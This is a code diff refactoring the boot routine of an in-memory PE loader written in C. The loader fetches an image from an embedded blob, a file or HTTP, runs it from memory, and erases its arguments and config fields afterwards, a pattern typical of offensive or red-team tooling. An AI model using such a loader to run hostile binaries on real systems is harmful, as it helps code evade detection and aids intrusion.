@@ -8,9 +8,9 @@
 #include "boot.h"
 
 static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config);
-static void* loadImage(Runtime_M* runtime, byte* config, uint32 size);
 static errno eraseArguments(Runtime_M* runtime);
 
+static void* loadImage(Runtime_M* runtime, byte* config);
 static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
 static void* loadImageFromFile(Runtime_M* runtime, byte* config);
 static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);
@@ -27,7 +27,6 @@ PELoader_M* Boot(void* ctx)
     // reserved context and extended arguments
     (void)ctx;
 
-    // load config and initialize PE Loader
     PELoader_Cfg config = {
         .FindAPI = runtime->HashAPI.FindAPI_MA,
     };
@@ -35,11 +34,21 @@ PELoader_M* Boot(void* ctx)
     errno err = NO_ERROR;
     for (;;)
     {
+        // load config from argument stub
         err = loadConfig(runtime, &config);
         if (err != NO_ERROR)
         {
             break;
         }
+        // prepare pe image data to config
+        void* image = loadImage(runtime, config.Image);
+        if (image == NULL)
+        {
+            err = GetLastErrno();
+            break;
+        }
+        config.Image = image;
+        // initialize pe loader
         loader = InitPELoader(runtime, &config);
         if (loader == NULL)
         {
@@ -47,7 +56,7 @@ PELoader_M* Boot(void* ctx)
             break;
         }
         // free image page at once
-        runtime->Memory.Free(config.Image);
+        runtime->Memory.Free(image);
         // erase useless arguments
         err = eraseArguments(runtime);
         if (err != NO_ERROR)
@@ -56,24 +65,27 @@ PELoader_M* Boot(void* ctx)
         }
         break;
     }
+    // clean critical fields at once
+    mem_init(&config, offsetof(PELoader_Cfg, WaitMain));
     if (err != NO_ERROR || loader == NULL)
     {
         runtime->Core.Exit();
         SetLastErrno(err);
         return NULL;
     }
+
+    // execute PE image
     if (config.NotAutoRun)
     {
         return loader;
     }
-
-    // execute PE image
     err = loader->Execute();
     if (!config.WaitMain || loader->IsDLL)
     {
         SetLastErrno(err);
         return loader;
     }
+
     // destroy pe loader
     errno eld = loader->Destroy();
     if (eld != NO_ERROR && err == NO_ERROR)
@@ -97,12 +109,6 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
     {
         return ERR_EMPTY_PE_IMAGE_DATA;
     }
-    void* image = loadImage(runtime, config->Image, size);
-    if (image == NULL)
-    {
-        return GetLastErrno();
-    }
-    config->Image = image;
     // load command line ANSI, it can be empty
     if (!runtime->Argument.GetPointer(ARG_ID_CMDLINE_A, &config->CommandLineA, NULL))
     {
@@ -145,7 +151,7 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
     {
         return ERR_NOT_FOUND_WAIT_MAIN;
     }
-    if (size != sizeof(bool))
+    if (size != sizeof(BOOL))
     {
         return ERR_INVALID_WAIT_MAIN;
     }
@@ -154,7 +160,7 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
     {
         return ERR_NOT_FOUND_ALLOW_SKIP_DLL;
     }
-    if (size != sizeof(bool))
+    if (size != sizeof(BOOL))
     {
         return ERR_INVALID_ALLOW_SKIP_DLL;
     }
@@ -163,7 +169,7 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
     {
         return ERR_NOT_FOUND_IGNORE_STD_IO;
     }
-    if (size != sizeof(bool))
+    if (size != sizeof(BOOL))
     {
         return ERR_INVALID_IGNORE_STD_IO;
     }
@@ -172,7 +178,7 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
     {
         return ERR_NOT_FOUND_NOT_AUTO_RUN;
     }
-    if (size != sizeof(bool))
+    if (size != sizeof(BOOL))
     {
         return ERR_INVALID_NOT_AUTO_RUN;
     }
@@ -181,20 +187,15 @@ static errno loadConfig(Runtime_M* runtime, PELoader_Cfg* config)
     {
         return ERR_NOT_FOUND_NOT_STOP_RUNTIME;
     }
-    if (size != sizeof(bool))
+    if (size != sizeof(BOOL))
     {
         return ERR_INVALID_NOT_STOP_RUNTIME;
     }
     return NO_ERROR;
 }
 
-static void* loadImage(Runtime_M* runtime, byte* config, uint32 size)
+static void* loadImage(Runtime_M* runtime, byte* config)
 {
-    if (size < 1)
-    {
-        SetLastErrno(ERR_INVALID_IMAGE_CONFIG);
-        return NULL;
-    }
     byte mode = *config;
     config++;
     switch (mode)
